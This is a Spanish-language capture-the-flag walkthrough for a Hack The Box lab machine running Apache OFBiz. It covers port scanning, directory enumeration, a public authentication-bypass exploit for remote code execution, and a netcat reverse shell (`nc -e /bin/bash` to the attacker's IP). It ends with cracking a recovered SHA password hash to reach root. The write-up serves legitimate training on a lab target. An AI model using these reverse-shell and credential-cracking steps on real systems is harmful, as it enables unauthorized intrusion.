## Etapa de Escaneo: 
primero hacemos un `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.252 -oG allPorts`
![[Pasted image 20240131220826.png]]
podemos ver que los puertos 22/80/443/41843. 
ahora podemos ver los datos de los servicios y los scripts: 
![[Pasted image 20240131221639.png]]
![[Pasted image 20240131221658.png]]
podemos ver que tiene un vhost que sería bizness.htb, ahora podemos hacer un whatweb para saber que hay en la pagina: 
![[Pasted image 20240131222542.png]]
podemos ver que tiene un Vhost por lo que podemos poner la ip con el host de la pagina para que cargue bien los elementos de la pagina: 
![[Pasted image 20240202115626.png]]
si se intenta hace un reconocimiento de las paginas con gobuster, pasará que la pagina no se puede analizar por que no tiene un ssl, y muestra el siguiente error: 
![[Pasted image 20240202120610.png]]
pero si hacemos un dirb, podemos ver que tenemos los siguientes directorios dentro de la web
![[Pasted image 20240202131123.png]]
si entramos a accounting, podemos ver la pagina del login del usuario:![[Pasted image 20240202131214.png]]
Podemos ver es que el login tiene el nombre de apache ofbiz y que el releace es el 18.120, 
si buscamos algún exploit para este tipo de servicio podemos encontrar que hay un github que tiene 2 scripts para hacer un rce:
(https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass)
![[Pasted image 20240202222226.png]]
si hacemos un cat al archivo README.md podemos ver el uso de este en este caso ocupamod el Run command on the remote server, lo cual nos ponemos en escucha en el puerto 443 con netcat `nc -nlvp 443`: 
![[Pasted image 20240202222455.png]]
Luego de ponernos en escucha podemos correr el script de python en donde lanzaremos una bash a traves de netcat de la siguiente forma `nc -e /bin/bash 10.10.14.214 443`: 
![[Pasted image 20240202222437.png]]
y obtenemos acceso a la maquina como el usuario ofbiz.
![[Pasted image 20240202223905.png]]
la enumerar la maquina podemos encontrar lo siguiente en la ruta /opt/ofbiz/runtime/data/ofbiz/seg0 encontramos la clave hacheada en sha que es esta `$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`:
![[Pasted image 20240202225330.png]]
una ves encontrado este hash ocupamos un script para desencriptar la contraseña: 
![[Pasted image 20240202232750.png]]
por lo tanto este script nos compara el hash con rockyou para poder encontrar la contraseña:
![[Pasted image 20240202232241.png]]
si hacemos un su root podemos acceder al super usuario gracias a la contraseña encontrada. 
![[Pasted image 20240202232618.png]]
